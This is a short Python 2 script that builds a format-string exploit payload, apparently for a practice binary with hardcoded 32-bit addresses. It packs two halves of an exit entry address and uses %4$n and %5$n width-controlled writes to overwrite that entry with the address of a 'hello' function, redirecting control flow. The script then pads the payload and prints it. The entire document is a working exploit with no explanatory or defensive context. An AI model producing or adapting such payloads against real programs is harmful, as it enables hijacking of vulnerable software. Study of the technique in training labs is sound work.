import struct
HELLO = 0x80484b4
EXIT_PLT = 0x8049724
s_EXIT_PLT = struct.pack("I",EXIT_PLT)
s_EXIT_PLT_2 = struct.pack("I",EXIT_PLT+2)
def pad(s):
    return s+'X'*(512-len(s))
exploit = ""
exploit += s_EXIT_PLT
exploit += s_EXIT_PLT_2
exploit += "%4$33964x"
exploit += "%4$n"
exploit += "%5$33616x"
exploit += "%5$n"
print pad(exploit)